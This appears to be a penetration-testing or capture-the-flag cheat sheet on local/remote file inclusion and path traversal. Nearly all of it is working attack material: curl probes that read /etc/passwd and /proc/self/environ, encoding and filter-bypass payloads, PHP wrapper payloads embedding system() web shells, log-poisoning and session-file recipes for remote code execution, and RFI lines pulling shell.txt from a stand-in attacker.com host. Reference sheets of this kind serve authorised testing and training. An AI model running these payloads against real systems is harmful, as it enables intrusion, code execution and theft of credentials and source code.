# LFI / RFI / Path Traversal

Local File Inclusion, Remote File Inclusion, Path Traversal — same family, different outcomes. Vulnerable sinks: anything that opens, requires, includes, or reads a file where part of the path is user-controlled.

## Identify

Look for these parameter names:
```
?file=  ?page=  ?path=  ?template=  ?doc=  ?folder=  ?lang=  ?include=
?dir=   ?load=  ?view=  ?show=      ?read=  ?url=     ?src=
```

Quick probes:
```bash
curl 'http://target/view?file=/etc/passwd'
curl 'http://target/view?file=../../../../etc/passwd'
curl 'http://target/view?file=....//....//....//etc/passwd'     # bypass stripping
curl 'http://target/view?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd'   # URL encoded
curl 'http://target/view?file=..%252f..%252fetc%252fpasswd'     # double URL encoded
```

If `/etc/passwd` content comes back, you have LFI. If `?file=https://attacker/shell.txt` executes, you have RFI (rare, usually PHP + `allow_url_include=On`).

## Classic payloads

```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%c0%af..%c0%afetc%c0%afpasswd
....//....//etc/passwd
..;/..;/etc/passwd                   # some servers strip ../ but not ..;/
/etc/passwd%00                       # PHP < 5.3.4 null-byte truncation
/etc/passwd%2500
/proc/self/environ                   # env vars (may contain creds)
/proc/self/cmdline
/proc/self/status
/var/log/apache2/access.log          # log poisoning + LFI = RCE
/var/log/auth.log                    # inject SSH user "<?php system($_GET['c']);?>"
C:\windows\win.ini                   # Windows
C:\xampp\htdocs\index.php
```

## PHP wrappers (when the sink is `include`/`require`)

```
php://filter/convert.base64-encode/resource=index.php    # read source as b64
php://filter/read=string.rot13/resource=index.php        # obfuscate past filters
php://filter/zlib.deflate|convert.base64-encode/resource=secrets.php
data://text/plain,<?php system($_GET["c"]); ?>&c=id      # inline code exec
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+&c=id
expect://id                                              # PECL expect only
zip://shell.zip%23cmd.php                                # chain with upload
phar://malicious.phar                                    # deserialization RCE
```

## Log poisoning → RCE

```bash
# 1. Inject PHP into web/SSH/mail log via UA / username
curl -A '<?php system($_GET["c"]); ?>' http://target/
# 2. Trigger via LFI reading the log
curl 'http://target/view?file=/var/log/apache2/access.log&c=id'
```

Common writable logs: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/auth.log`, `/var/log/mail.log`, `/proc/self/environ`.

## Session file RCE

```bash
# PHP sessions in /var/lib/php/sessions/sess_<PHPSESSID>
# 1. Set a cookie value that includes PHP code
curl -b 'PHPSESSID=abc; name=<?php system($_GET["c"]);?>' http://target/
# 2. Include the session file via LFI
curl 'http://target/view?file=/var/lib/php/sessions/sess_abc&c=id'
```

## RFI (rare, high reward)

Requires `allow_url_include=On` + `allow_url_fopen=On` on target.
```
?page=http://attacker.com/shell.txt
?page=\\attacker\share\shell.txt
?page=//attacker/shell.txt?           # trailing ? truncates .php suffix
```

## Filter bypasses

| Filter | Bypass |
| --- | --- |
| Strips `../` | `....//`, `..%2f`, `..%c0%af`, `..;/` |
| Appends `.php` | null byte `%00` (PHP < 5.3.4), `?`, `#`, path truncation (long `/./` chain) |
| Prepends `/var/www/` | `../../../etc/passwd` enough to escape |
| Blocks `/etc/passwd` | `/etc/./passwd`, `/etc//passwd`, `/etc\\passwd` |
| Blocks `..` | double URL encode `..%252e%252e`, UTF-8 overlongs |
| Whitelist of extensions | `?file=../../etc/passwd%00.jpg` |

## Automated

```bash
sqlmap -u 'http://target/?file=1' --level=5 --risk=3 --prefix=.. --suffix=%00    # last resort
# Burp Intruder with /opt/tools/PayloadsAllTheThings/File Inclusion/
```

## Offline reference

```bash
rg -n 'lfi|path traversal|file inclusion' /opt/tools/PayloadsAllTheThings/
ls /opt/tools/PayloadsAllTheThings/File\ Inclusion/
```

## Tips
- Always try `/proc/self/environ` and `/proc/self/cmdline` — often reveal container secrets or args.
- If you can read source via `php://filter`, dump every include target recursively — flags often live in config files.
- `expect://`, `phar://`, `zip://` wrappers survive many filter configurations that block `php://`.
- Path traversal in cookies/headers is underchecked — test `Cookie: path=../../etc/passwd`.
